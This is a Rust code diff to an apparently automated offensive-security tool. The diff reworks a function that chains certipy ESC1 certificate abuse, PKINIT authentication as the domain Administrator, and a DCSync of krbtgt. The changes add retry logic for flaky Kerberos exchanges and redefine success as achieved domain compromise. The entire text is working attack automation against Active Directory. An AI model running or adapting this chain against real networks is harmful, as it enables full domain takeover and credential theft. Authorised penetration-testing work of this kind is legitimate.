@@ -954,15 +954,37 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    let auth_output = CommandBuilder::new("certipy")
-        .arg("auth")
-        .flag("-pfx", &pfx_name)
-        .flag("-dc-ip", dc_ip)
-        .flag("-domain", domain)
-        .current_dir(&cwd)
-        .timeout_secs(120)
-        .execute()
-        .await?;
+    // certipy auth must send the bare sAMAccountName. For the built-in
+    // Administrator (RID-500) the UPN-form principal makes the PKINIT AS-REP
+    // fail with KRB_AP_ERR_MODIFIED and no ccache is written; -username derives
+    // the client name so the TGT/ccache lands. (SID-mapped UnPAC may still fail
+    // ETYPE_NOSUPP on RC4-disabled KDCs — that path is handled by the DCSync tail.)
+    let auth_user = upn.split('@').next().unwrap_or("administrator");
+    // certipy PKINIT intermittently fails the AS exchange with KRB_AP_ERR_MODIFIED
+    // ("Message stream modified") — a transient DH/session-key mismatch (~50% per
+    // attempt on some AES-only KDCs). Each attempt re-runs the exchange with fresh
+    // randomness, so retry a few times; one flaky auth otherwise sinks the whole
+    // chain (no ccache -> no DCSync tail) and burns a per-vuln failure slot.
+    let mut auth_output;
+    let mut auth_attempts = 0;
+    loop {
+        auth_attempts += 1;
+        auth_output = CommandBuilder::new("certipy")
+            .arg("auth")
+            .flag("-pfx", &pfx_name)
+            .flag("-dc-ip", dc_ip)
+            .flag("-domain", domain)
+            .flag("-username", auth_user)
+            .current_dir(&cwd)
+            .timeout_secs(120)
+            .execute()
+            .await?;
+        let transient = auth_output.stdout.contains("KRB_AP_ERR_MODIFIED")
+            || auth_output.stderr.contains("KRB_AP_ERR_MODIFIED");
+        if !transient || auth_attempts >= 4 {
+            break;
+        }
+    }
 
     let req_label = format!("certipy req (ESC1, upn={upn}, sid={sid})");
     let auth_label = format!("certipy auth ({pfx_name})");
@@ -1007,17 +1029,26 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     }
     let (combined_stdout, combined_stderr) = render_chain_output(&steps);
 
-    // Prefer the DCSync exit code when we ran it — that step is the one that
-    // actually establishes domain compromise on RC4-disabled KDCs.
-    let (exit_code, dcsync_success) = match &dcsync_output {
-        Some((_, out)) => (out.exit_code, out.success),
-        None => (auth_output.exit_code, true),
+    // Success + exit-code selection. On RC4-disabled KDCs `certipy auth` exits
+    // NON-ZERO (UnPAC prints KDC_ERR_ETYPE_NOSUPP) even though it produced a
+    // valid Administrator ccache — so `auth_output.success` must NOT veto the
+    // chain. When the DCSync tail ran, that step is the authoritative
+    // domain-compromise signal (it dumped krbtgt). Only when no tail ran do we
+    // fall back to requiring a clean auth that actually recovered an NT hash;
+    // an exit-0 auth that published neither a hash nor a DCSync must report
+    // failure so the vuln is retried instead of being deduped as done.
+    let (exit_code, overall_success) = match &dcsync_output {
+        Some((_, out)) => (out.exit_code, request_output.success && out.success),
+        None => (
+            auth_output.exit_code,
+            request_output.success && auth_output.success && got_nt_hash,
+        ),
     };
     Ok(ToolOutput {
         stdout: combined_stdout,
         stderr: combined_stderr,
         exit_code,
-        success: request_output.success && auth_output.success && dcsync_success,
+        success: overall_success,
     })
 }
 
